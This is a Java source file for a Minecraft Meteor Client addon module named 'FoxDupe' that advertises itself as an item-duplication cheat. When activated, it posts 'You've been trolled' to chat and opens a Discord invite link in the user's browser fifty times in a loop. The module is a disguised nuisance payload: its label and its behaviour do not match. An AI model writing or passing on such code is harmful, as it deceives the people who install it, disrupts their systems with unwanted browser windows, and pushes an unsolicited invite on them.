package com.example.addon.modules.misc;

import com.example.addon.Addon;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.text.Text;

public class FoxDupe extends Module {
    public FoxDupe() {
        super(Addon.misc, "FoxDupe", "dupe items");
    }

    @Override
    public void onActivate() {
        ChatUtils.sendMsg(Text.of("You've been trolled"));
        String url = "https://discord.gg/H9TXVgMk";
        
        for(int x = 0 ; x < 50 ; x++) {
            try {
                java.awt.Desktop.getDesktop().browse(java.net.URI.create(url));
            } catch (java.io.IOException e) {
                System.out.println(e.getMessage());
            }
        }
        toggle();
    }
}
